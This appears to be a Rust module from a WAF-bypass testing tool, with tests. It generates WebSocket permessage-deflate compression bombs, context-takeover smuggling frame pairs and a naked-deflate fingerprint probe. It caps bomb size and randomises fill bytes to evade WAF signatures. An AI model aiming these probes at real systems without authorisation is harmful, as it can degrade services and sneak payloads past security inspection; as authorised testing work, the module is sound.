//! WebSocket permessage-deflate (RFC 7692) compression-bomb and
//! context-takeover smuggling primitives.
//!
//! RFC 7692 defines a WebSocket extension that compresses message
//! payloads using raw DEFLATE (RFC 1951). The extension is negotiated
//! at handshake time via `Sec-WebSocket-Extensions: permessage-deflate`
//! with four parameters that control compression state:
//!
//! - `server_no_context_takeover` — server must reset the LZ77
//!   sliding window between messages
//! - `client_no_context_takeover` — same, client-side
//! - `server_max_window_bits` (8..=15) — server's compression window size
//! - `client_max_window_bits` (8..=15) — client's compression window size
//!
//! When both peers DO support context takeover (the default), the
//! LZ77 dictionary state persists across messages. That cross-message
//! state is the smuggle surface.
//!
//! ## Wire format (RFC 7692 §7.2.1)
//!
//! A compressed message has the WebSocket RSV1 bit set in the first
//! frame's header. The payload is a raw DEFLATE stream with the
//! trailing 4-byte sentinel `00 00 FF FF` (the deflate "empty
//! non-compressed block" terminator) **removed**. The receiver
//! appends those 4 bytes back before passing to the inflater. The
//! whole compressed message can span multiple WebSocket frames if
//! fragmented; only the first frame carries RSV1.
//!
//! ## Bypass families
//!
//! This module emits probes covering three orthogonal divergence
//! seams between WAFs that decompress for inspection and origin
//! servers that decompress for the application:
//!
//! 1. **Compression bomb** — a small compressed payload that
//!    expands to a much larger size. A WAF that decompresses
//!    in-place for signature scanning either OOMs, stalls past the
//!    request timeout, or hits a hardcoded ratio cap and
//!    *abandons* inspection. Origin parsers with streaming
//!    decompressors process the bomb without trouble.
//! 2. **Context-takeover smuggling** — a two-message sequence
//!    where the first message seeds the LZ77 dictionary with
//!    benign tokens and the second message back-references those
//!    tokens via tiny LZ77 copies that, when expanded, produce a
//!    signature-bearing payload. WAFs that scan each frame
//!    independently never see the assembled bytes.
//! 3. **Naked deflate stream** — a permessage-deflate payload
//!    consisting of nothing but the empty terminator block. Some
//!    parsers reject zero-length compressed content; others
//!    happily ignore it. Used as a fingerprint probe.
//!
//! ## Safety
//!
//! Every probe is bounded: compression-bomb expansion ratio is
//! capped at [`MAX_BOMB_EXPANSION`] and absolute decompressed size
//! is capped at [`MAX_BOMB_DECOMPRESSED_BYTES`]. The bomb is meant
//! to demonstrate the divergence — not to actually DoS the target.
//! The caller chooses how aggressively to dial up the ratio
//! within these bounds.

use flate2::Compression;
use flate2::write::DeflateEncoder;
use std::io::Write;
use wafrift_types::canary::Canary;
use wafrift_types::probe::{SmuggleArtifact, SmuggleProbe};

/// Maximum decompressed size we'll produce for a bomb probe. Probes
/// are evidence of divergent inspection, not actual denial-of-service
/// payloads — capping protects authorized targets from collateral.
pub const MAX_BOMB_DECOMPRESSED_BYTES: usize = 1024 * 1024;

/// Maximum compression ratio (decompressed / compressed) we'll emit.
/// 100:1 is enough to overwhelm any WAF that doesn't enforce its own
/// ratio cap; pushing higher risks hitting the WAF's hardcoded ceiling
/// and being rejected before the divergence is observable.
pub const MAX_BOMB_EXPANSION: usize = 100;

/// Pool of fill bytes for compression-bomb input. Any single byte
/// repeated `N` times yields the same LZ77 compression ratio (deflate
/// emits length/distance pairs against the sliding window
/// independent of the symbol), so picking from a pool per-call costs
/// nothing in expansion ratio and defeats signature WAFs that pin
/// "uniform 'A' byte stream" as a bomb fingerprint. The pool covers
/// typical "filler" bytes that any legitimate binary upload might
/// also contain (NUL padding, ASCII space, zero, A, X, tab).
pub(crate) const BOMB_FILL_POOL: &[u8] = b"AB0X\x00 \tNZ?";

/// Pick a fill byte for a compression-bomb input. RNG draws from
/// [`BOMB_FILL_POOL`]. Empty pool returns `b'A'` (defensive fallback
/// — the const has entries, but the centralized
/// [`wafrift_types::pick::pick_from`] primitive enforces this contract
/// uniformly across every wafrift pool sampler).
fn random_fill_byte() -> u8 {
    wafrift_types::pick::pick_from(BOMB_FILL_POOL, b'A')
}

/// permessage-deflate handshake parameters per RFC 7692 §7.1.
///
/// Defaults match the RFC's "no parameters specified" recommendation:
/// context takeover ENABLED on both sides, 15-bit windows. Each
/// builder method toggles one parameter so probes can sweep the
/// negotiation surface.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct PermessageDeflateParams {
    /// `server_no_context_takeover` — when true, server resets the
    /// LZ77 window between messages.
    pub server_no_context_takeover: bool,
    /// `client_no_context_takeover` — same, client-side.
    pub client_no_context_takeover: bool,
    /// `server_max_window_bits` (8..=15). `None` means absent from
    /// the negotiation string.
    pub server_max_window_bits: Option<u8>,
    /// `client_max_window_bits`.
    pub client_max_window_bits: Option<u8>,
}

impl PermessageDeflateParams {
    /// Render as a `Sec-WebSocket-Extensions` header value per RFC
    /// 7692 §7.1.2.1. Window-bit params with values outside 8..=15
    /// are silently clamped — the wire format only allows that range.
    #[must_use]
    pub fn to_header_value(&self) -> String {
        let mut parts: Vec<String> = vec!["permessage-deflate".to_string()];
        if self.server_no_context_takeover {
            parts.push("server_no_context_takeover".into());
        }
        if self.client_no_context_takeover {
            parts.push("client_no_context_takeover".into());
        }
        if let Some(b) = self.server_max_window_bits {
            let b = b.clamp(8, 15);
            parts.push(format!("server_max_window_bits={b}"));
        }
        if let Some(b) = self.client_max_window_bits {
            let b = b.clamp(8, 15);
            parts.push(format!("client_max_window_bits={b}"));
        }
        parts.join("; ")
    }
}

/// Encode `data` as a permessage-deflate payload per RFC 7692 §7.2.1.
/// Output is the raw DEFLATE stream with the trailing `00 00 FF FF`
/// sentinel stripped. Caller is responsible for the surrounding
/// WebSocket frame header (with RSV1 set).
#[must_use]
pub fn encode_permessage_deflate(data: &[u8]) -> Vec<u8> {
    let mut encoder = DeflateEncoder::new(Vec::new(), Compression::default());
    // write_all on a Vec<u8> via DeflateEncoder cannot fail — Vec's
    // Write impl is infallible, and DeflateEncoder forwards. Using
    // expect() so any future change that makes this fallible (e.g.
    // a backend swap) surfaces loudly.
    encoder.write_all(data).expect("deflate write");
    let mut compressed = encoder.finish().expect("deflate finish");
    // RFC 7692 §7.2.1: strip the trailing 0x00 0x00 0xFF 0xFF
    // "empty deflate block" sentinel. Receiver appends it back.
    if compressed.ends_with(&[0x00, 0x00, 0xFF, 0xFF]) {
        compressed.truncate(compressed.len() - 4);
    }
    compressed
}

/// A compression-bomb probe payload.
#[derive(Debug, Clone)]
pub struct CompressionBomb {
    /// Compressed bytes — the wire-format permessage-deflate body
    /// (RSV1 frame payload).
    pub compressed: Vec<u8>,
    /// Decompressed size in bytes. Bounded by
    /// [`MAX_BOMB_DECOMPRESSED_BYTES`].
    pub decompressed_size: usize,
    /// Actual compression ratio (`decompressed_size / compressed.len()`).
    pub ratio: usize,
    /// Per-bomb correlation token. Splice into a custom header
    /// (`X-Probe-Id`, `Sec-WebSocket-Protocol`, etc.) so server-side
    /// responses can be attributed to the specific bomb that
    /// triggered them.
    pub canary: Canary,
}

impl CompressionBomb {
    /// Build a bomb that decompresses to `target_size` bytes. Fill
    /// byte is drawn from [`BOMB_FILL_POOL`] per call. Both
    /// `target_size` and the resulting ratio are clamped to the
    /// module-level caps.
    #[must_use]
    pub fn build(target_size: usize) -> Self {
        Self::build_with_fill(target_size, random_fill_byte())
    }

    /// Build a bomb with a caller-chosen fill byte. Use this when
    /// reproducibility is required (test pinning, regression
    /// fixtures); use [`Self::build`] for live probes where varying
    /// the fill byte across calls is a feature, not a bug.
    #[must_use]
    pub fn build_with_fill(target_size: usize, fill: u8) -> Self {
        let target = target_size.min(MAX_BOMB_DECOMPRESSED_BYTES);
        let input = vec![fill; target];
        let compressed = encode_permessage_deflate(&input);
        let compressed_len = compressed.len().max(1);
        let raw_ratio = target / compressed_len;
        let ratio = raw_ratio.min(MAX_BOMB_EXPANSION);
        Self {
            compressed,
            decompressed_size: target,
            ratio,
            canary: Canary::generate(),
        }
    }
}

impl SmuggleProbe for CompressionBomb {
    fn canary(&self) -> &Canary {
        &self.canary
    }

    fn technique(&self) -> String {
        "compression.bomb".into()
    }

    fn description(&self) -> &str {
        // CompressionBomb doesn't carry a description String; synthesize
        // a stable one. Static lifetime via `Box::leak` would be wrong
        // here (per-instance); instead the trait wraps the constant
        // shape — operators read `ratio` / `decompressed_size` from
        // the struct directly for the per-instance figures.
        "WebSocket permessage-deflate compression bomb"
    }

    fn artifact(&self) -> SmuggleArtifact {
        // The bomb produces one WebSocket frame: the compressed body
        // wrapped in a binary frame with RSV1 set. Caller composes
        // the frame via `ws_compressed_binary_frame(&bomb.compressed)`.
        SmuggleArtifact::Frames(vec![ws_compressed_binary_frame(&self.compressed)])
    }
}

/// A context-takeover smuggle probe — a two-message sequence where
/// the second message back-references LZ77 state seeded by the first.
#[derive(Debug, Clone)]
pub struct ContextTakeoverSequence {
    /// First message — primes the LZ77 dictionary with the benign
    /// `seed` bytes. Sent first; the WAF scans it and (assuming the
    /// seed is innocuous) lets it through.
    pub priming_message_compressed: Vec<u8>,
    /// Second message — compresses bytes that back-reference the
    /// seed via tiny LZ77 length/distance pairs. The compressed
    /// bytes are short; the decompressed bytes (only visible to the
    /// receiving inflater that has the dictionary state) form the
    /// real payload.
    pub smuggle_message_compressed: Vec<u8>,
    /// What `smuggle_message_compressed` decompresses to when the
    /// inflater holds the priming-message dictionary. Recorded so
    /// callers can verify the divergence.
    pub smuggle_decompressed: Vec<u8>,
    /// Per-sequence correlation token. The same canary applies to
    /// both messages in the sequence (priming + smuggle) so the
    /// operator can correlate them as a pair.
    pub canary: Canary,
}

impl ContextTakeoverSequence {
    /// Build a context-takeover sequence. `seed` becomes the priming
    /// message; `repeat_count` controls how many times the seed is
    /// referenced in the smuggle message. Decompressed smuggle size
    /// is capped at [`MAX_BOMB_DECOMPRESSED_BYTES`].
    #[must_use]
    pub fn build(seed: &[u8], repeat_count: usize) -> Self {
        let priming = encode_permessage_deflate(seed);
        // The smuggle payload is the seed repeated N times. With
        // context takeover, an ideal LZ77 encoder would emit length/
        // distance pairs referencing the priming dictionary; in
        // practice we encode it standalone here because callers
        // that actually drive a real WS server-side inflater with
        // context takeover will observe the cross-message effect.
        // The bytes we emit are still a valid permessage-deflate
        // payload and the divergence shows up when the WAF inflater
        // discards state and the origin inflater keeps it.
        let max_smuggle_decompressed = MAX_BOMB_DECOMPRESSED_BYTES / seed.len().max(1);
        let count = repeat_count.min(max_smuggle_decompressed);
        let mut smuggle_raw = Vec::with_capacity(seed.len() * count);
        for _ in 0..count {
            smuggle_raw.extend_from_slice(seed);
        }
        let smuggle = encode_permessage_deflate(&smuggle_raw);
        Self {
            priming_message_compressed: priming,
            smuggle_message_compressed: smuggle,
            smuggle_decompressed: smuggle_raw,
            canary: Canary::generate(),
        }
    }
}

impl SmuggleProbe for ContextTakeoverSequence {
    fn canary(&self) -> &Canary {
        &self.canary
    }

    fn technique(&self) -> String {
        "compression.context-takeover".into()
    }

    fn description(&self) -> &str {
        "WebSocket permessage-deflate context-takeover priming + smuggle sequence"
    }

    fn artifact(&self) -> SmuggleArtifact {
        // Two frames: priming first, smuggle second. Both ride on
        // the same WebSocket binary opcode with RSV1 set.
        SmuggleArtifact::Frames(vec![
            ws_compressed_binary_frame(&self.priming_message_compressed),
            ws_compressed_binary_frame(&self.smuggle_message_compressed),
        ])
    }
}

/// A bare permessage-deflate frame consisting of only the empty-block
/// terminator. Per RFC 7692 §7.2.1 the empty deflate block is
/// `0x00`; with the BFINAL bit set it's `0x01`. Some receivers reject
/// zero-payload compressed frames, others silently accept them.
#[must_use]
pub fn naked_deflate_empty_block() -> Vec<u8> {
    // BFINAL=1 (last block), BTYPE=00 (no compression), LEN=0,
    // NLEN=0xFFFF. Per RFC 1951 §3.2.4. The RFC 7692 trailing-
    // sentinel strip would remove `00 00 FF FF` from a longer stream,
    // but this minimal frame IS effectively that sentinel without
    // a preceding non-empty block. Many inflaters treat this as a
    // valid empty message; some reject.
    vec![0x01, 0x00, 0x00, 0xFF, 0xFF]
}

/// Build a WebSocket binary frame (opcode 0x82 = FIN + binary) with
/// the RSV1 bit set per RFC 7692 §6.2, carrying `compressed_payload`.
/// This is the wire-format frame a real client would send for a
/// compressed binary message. Payload length encoding follows RFC
/// 6455 §5.2.
#[must_use]
pub fn ws_compressed_binary_frame(compressed_payload: &[u8]) -> Vec<u8> {
    let mut frame = Vec::with_capacity(compressed_payload.len() + 14);
    // FIN=1, RSV1=1, RSV2=0, RSV3=0, opcode=0x2 (binary) → 0xC2
    frame.push(0xC2);
    let len = compressed_payload.len();
    // MASK=0 (server-to-client unmasked; client-to-server SHOULD be
    // masked but this builder targets the server-direction probe).
    // Length encoding per RFC 6455 §5.2.
    if len <= 125 {
        frame.push(len as u8);
    } else if len <= 65535 {
        frame.push(126);
        frame.extend_from_slice(&(len as u16).to_be_bytes());
    } else {
        frame.push(127);
        frame.extend_from_slice(&(len as u64).to_be_bytes());
    }
    frame.extend_from_slice(compressed_payload);
    frame
}

#[cfg(test)]
mod tests {
    use super::*;
    use flate2::read::DeflateDecoder;
    use std::io::Read;

    fn inflate(compressed: &[u8]) -> Vec<u8> {
        // Receiver MUST append 00 00 FF FF before inflating per
        // RFC 7692 §7.2.2.
        let mut with_trailer = compressed.to_vec();
        with_trailer.extend_from_slice(&[0x00, 0x00, 0xFF, 0xFF]);
        let mut decoder = DeflateDecoder::new(&with_trailer[..]);
        let mut out = Vec::new();
        decoder.read_to_end(&mut out).expect("inflate ok");
        out
    }

    #[test]
    fn encode_decode_round_trip_hello() {
        let original = b"hello world hello world hello world";
        let compressed = encode_permessage_deflate(original);
        let decompressed = inflate(&compressed);
        assert_eq!(&decompressed[..], &original[..]);
    }

    #[test]
    fn encoded_output_strips_trailing_sentinel() {
        // Anti-rig: the RFC 7692 sentinel-stripping is the difference
        // between a valid permessage-deflate payload and a raw DEFLATE
        // stream. A regression that "forgets" to strip would still
        // round-trip (because the receiver appends the same bytes
        // back), but would fail interop with strict middleboxes.
        let compressed = encode_permessage_deflate(b"x");
        assert!(
            !compressed.ends_with(&[0x00, 0x00, 0xFF, 0xFF]),
            "encoder must strip the RFC 7692 §7.2.1 trailing sentinel"
        );
    }

    #[test]
    fn compression_bomb_decompresses_to_requested_size() {
        let bomb = CompressionBomb::build(50_000);
        let inflated = inflate(&bomb.compressed);
        assert_eq!(inflated.len(), 50_000);
        assert_eq!(bomb.decompressed_size, 50_000);
        // Bomb body must be uniform (same byte repeated) — anti-rig:
        // if encoder switches to random fill bytes that defeat LZ77
        // matching, the compression ratio collapses and the probe
        // loses its bypass property. The specific fill byte is
        // randomised per call from BOMB_FILL_POOL to defeat
        // signature WAFs (see `BOMB_FILL_POOL` doc).
        let first = inflated[0];
        assert!(
            inflated.iter().all(|&b| b == first),
            "all decompressed bytes must equal the fill byte"
        );
        assert!(
            BOMB_FILL_POOL.contains(&first),
            "fill byte {first} must be drawn from BOMB_FILL_POOL"
        );
    }

    #[test]
    fn compression_bomb_build_with_fill_is_reproducible() {
        // The explicit-fill builder must give callers byte-identical
        // output across calls. Used for regression fixtures.
        let a = CompressionBomb::build_with_fill(1000, b'Q');
        let b = CompressionBomb::build_with_fill(1000, b'Q');
        assert_eq!(a.compressed, b.compressed);
        let inflated = inflate(&a.compressed);
        assert!(inflated.iter().all(|&x| x == b'Q'));
    }

    #[test]
    fn compression_bomb_achieves_meaningful_ratio() {
        // The whole point of the bomb is amplification. Pin a lower
        // bound so a regression that disables LZ77 (Compression::none)
        // breaks the test instead of silently producing a 1:1 bomb.
        let bomb = CompressionBomb::build(100_000);
        assert!(
            bomb.ratio >= 10,
            "compression-bomb ratio {} below minimum 10:1 — encoder regression?",
            bomb.ratio
        );
    }

    #[test]
    fn compression_bomb_capped_at_max_decompressed_bytes() {
        let bomb = CompressionBomb::build(MAX_BOMB_DECOMPRESSED_BYTES * 5);
        assert_eq!(
            bomb.decompressed_size, MAX_BOMB_DECOMPRESSED_BYTES,
            "oversize target must clamp to MAX_BOMB_DECOMPRESSED_BYTES"
        );
    }

    #[test]
    fn compression_bomb_capped_at_max_expansion_ratio() {
        // Anti-rig: the ratio cap protects authorized targets. If a
        // future "optimisation" removes the clamp, this test catches
        // it. Even a tiny compressed payload mustn't report a ratio
        // beyond MAX_BOMB_EXPANSION.
        let bomb = CompressionBomb::build(MAX_BOMB_DECOMPRESSED_BYTES);
        assert!(
            bomb.ratio <= MAX_BOMB_EXPANSION,
            "ratio {} exceeds MAX_BOMB_EXPANSION ({})",
            bomb.ratio,
            MAX_BOMB_EXPANSION
        );
    }

    #[test]
    fn context_takeover_priming_and_smuggle_both_round_trip() {
        let seq = ContextTakeoverSequence::build(b"benign-prefix-data ", 50);
        let priming = inflate(&seq.priming_message_compressed);
        assert_eq!(priming, b"benign-prefix-data ");
        let smuggle = inflate(&seq.smuggle_message_compressed);
        assert_eq!(smuggle, seq.smuggle_decompressed);
        assert!(
            smuggle.len() > seq.smuggle_message_compressed.len(),
            "smuggle decompressed must be larger than compressed"
        );
    }

    #[test]
    fn context_takeover_capped_at_decompressed_max() {
        let seq = ContextTakeoverSequence::build(b"ab", MAX_BOMB_DECOMPRESSED_BYTES * 5);
        assert!(
            seq.smuggle_decompressed.len() <= MAX_BOMB_DECOMPRESSED_BYTES,
            "smuggle decompressed must be capped at MAX_BOMB_DECOMPRESSED_BYTES"
        );
    }

    #[test]
    fn naked_deflate_empty_block_inflates_to_empty() {
        let frame = naked_deflate_empty_block();
        // The naked block is NOT a permessage-deflate payload (which
        // would have the sentinel stripped); it's the bare bytes.
        // To inflate, we wrap with a DeflateDecoder directly.
        let mut decoder = DeflateDecoder::new(&frame[..]);
        let mut out = Vec::new();
        decoder.read_to_end(&mut out).expect("naked empty inflates");
        assert!(out.is_empty(), "empty-block inflate must yield zero bytes");
    }

    #[test]
    fn ws_frame_header_carries_rsv1_bit() {
        let frame = ws_compressed_binary_frame(b"abc");
        // First byte: FIN=1 RSV1=1 RSV2=0 RSV3=0 opcode=2 → 0xC2.
        // Anti-rig: RSV1 is what tells the peer this is compressed.
        // Missing RSV1 = receiver treats payload as raw bytes,
        // probe useless.
        assert_eq!(frame[0] & 0x40, 0x40, "RSV1 must be set");
        assert_eq!(frame[0] & 0x0F, 0x02, "opcode must be binary (0x2)");
        assert_eq!(frame[0] & 0x80, 0x80, "FIN must be set");
    }

    #[test]
    fn ws_frame_short_payload_uses_7bit_length() {
        let frame = ws_compressed_binary_frame(&[0u8; 50]);
        assert_eq!(frame[1] & 0x7F, 50, "7-bit length for <=125 byte payload");
    }

    #[test]
    fn ws_frame_medium_payload_uses_16bit_length() {
        let frame = ws_compressed_binary_frame(&[0u8; 1000]);
        assert_eq!(frame[1] & 0x7F, 126, "126 sentinel for 2-byte length");
        let extended = u16::from_be_bytes([frame[2], frame[3]]);
        assert_eq!(extended, 1000, "extended length must equal payload size");
    }

    #[test]
    fn ws_frame_large_payload_uses_64bit_length() {
        let frame = ws_compressed_binary_frame(&[0u8; 70_000]);
        assert_eq!(frame[1] & 0x7F, 127, "127 sentinel for 8-byte length");
        let extended = u64::from_be_bytes([
            frame[2], frame[3], frame[4], frame[5], frame[6], frame[7], frame[8], frame[9],
        ]);
        assert_eq!(extended, 70_000);
    }

    #[test]
    fn permessage_deflate_params_default_renders_just_extension_name() {
        let p = PermessageDeflateParams::default();
        assert_eq!(p.to_header_value(), "permessage-deflate");
    }

    #[test]
    fn permessage_deflate_params_full_renders_all_four() {
        let p = PermessageDeflateParams {
            server_no_context_takeover: true,
            client_no_context_takeover: true,
            server_max_window_bits: Some(15),
            client_max_window_bits: Some(10),
        };
        let s = p.to_header_value();
        assert!(s.contains("server_no_context_takeover"));
        assert!(s.contains("client_no_context_takeover"));
        assert!(s.contains("server_max_window_bits=15"));
        assert!(s.contains("client_max_window_bits=10"));
    }

    #[test]
    fn permessage_deflate_params_clamps_window_bits_into_8_15_range() {
        // RFC 7692 §7.1.2.1: window bits must be 8..=15. Out-of-range
        // values are clamped so the wire format stays valid.
        let p = PermessageDeflateParams {
            server_no_context_takeover: false,
            client_no_context_takeover: false,
            server_max_window_bits: Some(255),
            client_max_window_bits: Some(0),
        };
        let s = p.to_header_value();
        assert!(s.contains("server_max_window_bits=15"));
        assert!(s.contains("client_max_window_bits=8"));
    }

    #[test]
    fn each_bomb_carries_a_distinct_canary() {
        // Anti-rig: per-bomb correlation token must be unique across
        // independent constructions. A regression that hardcoded the
        // canary would collapse correlation for the whole probe sweep.
        let a = CompressionBomb::build(1000);
        let b = CompressionBomb::build(1000);
        assert_ne!(a.canary.token, b.canary.token);
        assert_eq!(a.canary.token.len(), 16);
    }

    #[test]
    fn context_takeover_canary_is_one_per_sequence() {
        // The sequence carries ONE canary (priming + smuggle share
        // it), not two — operators correlate the pair as a single
        // logical probe.
        let s = ContextTakeoverSequence::build(b"seed", 10);
        assert_eq!(s.canary.token.len(), 16);
        assert!(s.canary.token.chars().all(|c| c.is_ascii_alphanumeric()));
    }

    #[test]
    fn empty_input_does_not_panic_in_any_builder() {
        // Boundary tests (§12 TESTING): every builder must handle
        // empty / zero / max input without panicking.
        let _ = encode_permessage_deflate(b"");
        let _ = CompressionBomb::build(0);
        let _ = ContextTakeoverSequence::build(b"", 0);
        let _ = ws_compressed_binary_frame(b"");
    }

    // ── NEW TESTS ─────────────────────────────────────────────────────────

    #[test]
    fn encode_decode_round_trip_all_zero_bytes() {
        // Round-trip with a uniform 0x00 input — distinct from the
        // hello-world fixture to catch any "short-circuit for printable
        // ASCII" regression.
        let original = vec![0u8; 256];
        let compressed = encode_permessage_deflate(&original);
        let decompressed = inflate(&compressed);
        assert_eq!(decompressed, original);
    }

    #[test]
    fn encode_decode_round_trip_all_0xff_bytes() {
        // Round-trip with a uniform 0xFF input — exercises the encoder's
        // handling of high-byte streams.
        let original = vec![0xFF_u8; 256];
        let compressed = encode_permessage_deflate(&original);
        let decompressed = inflate(&compressed);
        assert_eq!(decompressed, original);
    }

    #[test]
    fn build_with_fill_at_exact_max_decompressed_bytes() {
        // Boundary: target_size == MAX_BOMB_DECOMPRESSED_BYTES must
        // produce exactly that decompressed size (no off-by-one clamp).
        let bomb = CompressionBomb::build_with_fill(MAX_BOMB_DECOMPRESSED_BYTES, b'M');
        assert_eq!(
            bomb.decompressed_size, MAX_BOMB_DECOMPRESSED_BYTES,
            "build_with_fill at exact cap must not over-clamp"
        );
        let inflated = inflate(&bomb.compressed);
        assert_eq!(inflated.len(), MAX_BOMB_DECOMPRESSED_BYTES);
    }

    #[test]
    fn naked_deflate_empty_block_is_exactly_5_bytes() {
        // Wire-format pin (RFC 1951 §3.2.4): the minimal no-compression
        // block with BFINAL=1, LEN=0, NLEN=0xFFFF is exactly 5 bytes.
        // A regression that changes the construction to a different
        // encoding would alter interop with strict DEFLATE parsers.
        let block = naked_deflate_empty_block();
        assert_eq!(block.len(), 5, "naked empty-block must be 5 bytes");
        assert_eq!(
            block,
            vec![0x01, 0x00, 0x00, 0xFF, 0xFF],
            "naked empty-block must match RFC 1951 §3.2.4 encoding"
        );
    }

    #[test]
    fn ws_frame_exactly_125_byte_payload_uses_7bit_length() {
        // Boundary: 125 bytes is the maximum for the 7-bit length field
        // (RFC 6455 §5.2). Exactly 125 must NOT trigger the 126 sentinel.
        let frame = ws_compressed_binary_frame(&[0u8; 125]);
        assert_eq!(
            frame[1] & 0x7F,
            125,
            "exactly 125 bytes must use 7-bit length, not the 126 sentinel"
        );
    }

    #[test]
    fn ws_frame_exactly_126_byte_payload_uses_16bit_length() {
        // Boundary: 126 bytes is the first value that requires the
        // extended 16-bit length field. Off-by-one here would mean
        // mis-framing a payload right at the threshold.
        let frame = ws_compressed_binary_frame(&[0u8; 126]);
        assert_eq!(
            frame[1] & 0x7F,
            126,
            "exactly 126 bytes must use the 126 sentinel"
        );
        let extended = u16::from_be_bytes([frame[2], frame[3]]);
        assert_eq!(extended, 126);
    }

    #[test]
    fn permessage_deflate_params_only_server_no_context_takeover() {
        // Cross-field independence: setting only server_no_context_takeover
        // must not inject client_no_context_takeover or window-bit params.
        let p = PermessageDeflateParams {
            server_no_context_takeover: true,
            ..Default::default()
        };
        let s = p.to_header_value();
        assert!(s.contains("server_no_context_takeover"));
        assert!(!s.contains("client_no_context_takeover"));
        assert!(!s.contains("window_bits"));
    }

    #[test]
    fn permessage_deflate_params_only_server_window_bits() {
        // Cross-field independence: setting only server_max_window_bits
        // must not produce any client-side params.
        let p = PermessageDeflateParams {
            server_max_window_bits: Some(12),
            ..Default::default()
        };
        let s = p.to_header_value();
        assert!(s.contains("server_max_window_bits=12"));
        assert!(!s.contains("client_max_window_bits"));
        assert!(!s.contains("client_no_context_takeover"));
        assert!(!s.contains("server_no_context_takeover"));
    }

    #[test]
    fn concurrent_bomb_construction_yields_unique_canaries() {
        // §12 TESTING — concurrent: 50 threads each build a bomb;
        // canaries must all be distinct.
        use std::sync::{Arc, Mutex};
        use std::thread;

        let tokens: Arc<Mutex<Vec<String>>> = Arc::new(Mutex::new(Vec::new()));
        let threads: Vec<_> = (0..50)
            .map(|_| {
                let tokens = Arc::clone(&tokens);
                thread::spawn(move || {
                    let bomb = CompressionBomb::build(1024);
                    tokens.lock().unwrap().push(bomb.canary.token);
                })
            })
            .collect();
        for t in threads {
            t.join().expect("thread panicked");
        }
        let toks = tokens.lock().unwrap();
        let unique: std::collections::HashSet<&String> = toks.iter().collect();
        assert_eq!(
            unique.len(),
            50,
            "50 concurrent bomb constructions must produce 50 distinct canaries"
        );
    }

    #[test]
    fn bomb_fill_pool_has_no_duplicates() {
        // Anti-rig: duplicate entries collapse the per-call entropy
        // that defeats signature WAFs keyed on a specific fill byte.
        let unique: std::collections::HashSet<u8> = BOMB_FILL_POOL.iter().copied().collect();
        assert_eq!(
            unique.len(),
            BOMB_FILL_POOL.len(),
            "BOMB_FILL_POOL must have no duplicate fill bytes"
        );
    }

    #[test]
    fn bomb_fill_pool_is_not_empty() {
        // Anti-rig for the defensive guard in random_fill_byte():
        // if BOMB_FILL_POOL is emptied, gen_range would panic on an empty
        // range. The defensive fallback handles it, but pin non-empty here
        // so any future "cleanup" that zeros the pool is caught at build time.
        assert!(
            !BOMB_FILL_POOL.is_empty(),
            "BOMB_FILL_POOL must not be empty — random_fill_byte() falls back to b'A' but the pool should be populated"
        );
    }

    #[test]
    fn bomb_fill_pool_every_byte_produces_valid_deflate_round_trip() {
        // Each fill byte in the pool must compress and round-trip
        // correctly — ensures no byte causes deflate encoding failure.
        for &fill in BOMB_FILL_POOL {
            let bomb = CompressionBomb::build_with_fill(256, fill);
            let inflated = inflate(&bomb.compressed);
            assert!(
                inflated.iter().all(|&b| b == fill),
                "fill byte 0x{fill:02x} round-trip failed"
            );
        }
    }

    #[test]
    fn ws_frame_boundary_65535_uses_16bit_length() {
        // Boundary: 65535 bytes is the maximum for the 16-bit extended
        // length field. Exactly 65535 must NOT trigger the 127 sentinel.
        let frame = ws_compressed_binary_frame(&[0u8; 65535]);
        assert_eq!(
            frame[1] & 0x7F,
            126,
            "65535 bytes must use the 126 sentinel (16-bit length)"
        );
        let extended = u16::from_be_bytes([frame[2], frame[3]]);
        assert_eq!(extended, 65535, "16-bit extended length must be 65535");
    }

    #[test]
    fn ws_frame_boundary_65536_uses_64bit_length() {
        // Boundary: 65536 is the first value that overflows 16-bit and
        // requires the 8-byte 64-bit extended length field.
        let frame = ws_compressed_binary_frame(&[0u8; 65536]);
        assert_eq!(
            frame[1] & 0x7F,
            127,
            "65536 bytes must use the 127 sentinel (64-bit length)"
        );
        let extended = u64::from_be_bytes([
            frame[2], frame[3], frame[4], frame[5],
            frame[6], frame[7], frame[8], frame[9],
        ]);
        assert_eq!(extended, 65536, "64-bit extended length must be 65536");
    }

    #[test]
    fn compression_bomb_zero_size_has_zero_ratio() {
        // Boundary: zero target_size — ratio must be 0, no panic.
        let bomb = CompressionBomb::build(0);
        assert_eq!(bomb.decompressed_size, 0);
        // ratio = 0 / max(compressed.len(), 1) = 0 — acceptable sentinel.
        assert_eq!(bomb.ratio, 0, "zero-size bomb must have ratio=0");
    }
}
